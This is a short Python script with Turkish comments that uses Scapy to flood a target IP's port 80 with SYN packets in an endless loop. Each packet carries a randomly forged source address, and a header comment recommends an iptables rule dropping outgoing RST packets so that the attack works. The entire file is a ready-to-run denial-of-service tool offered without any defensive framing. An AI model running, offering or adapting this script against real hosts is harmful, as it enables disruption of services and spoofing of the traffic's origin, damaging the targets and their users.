#! /usr/bin/python

# Bu kod çalıştırılmadan önce aşağıdaki iptables kuralının girilmesi öneriliyor:
# Bu kural, gönderilen SYN paketlerine karşılık gelen RST (Reset) bayraklarını engelleyerek saldırının etkili olmasını sağlar.
# iptables -t filter -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

import sys  # Komut satırı argümanlarını işlemek için 'sys' modülü.
import random  # Rastgele sayı üretmek için 'random' modülü.
from scapy.all import *  # Scapy'nin tüm işlevlerini kullanmak için 'scapy.all' modülü içe aktarılıyor.

def main(argv):
    # Komut satırından yeterli argüman olup olmadığını kontrol ediyoruz
    if len(argv) != 1:
        print("Usage: python script.py <destination_ip>")
        sys.exit(1)

    dest_ip = argv[0]  # Hedef IP adresi argümandan alınıyor

    # Sonsuz bir döngü içinde sürekli olarak SYN paketleri gönderiyoruz
    while True:
        # Rastgele bir IP adresi oluşturuluyor
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

        # IP ve TCP katmanlarını birleştirerek bir SYN paketi oluşturuluyor
        packet = IP(src=src_ip, dst=dest_ip, id=123, ttl=100) / TCP(
            sport=RandShort(),  # Rastgele bir kaynak portu
            dport=80,  # Hedef portu 80 (HTTP)
            seq=123456,  # Sabit bir sequence numarası
            ack=1000,  # Sabit bir acknowledgment numarası
            window=1000,  # Sabit bir pencere boyutu
            flags="S"  # SYN bayrağı
        )

        # Paketi gönderiyoruz
        send(packet)

if __name__ == "__main__":
    # Komut satırı argümanlarından hedef IP adresini alıyoruz ve main() fonksiyonunu çağırıyoruz
    main(sys.argv[1:])
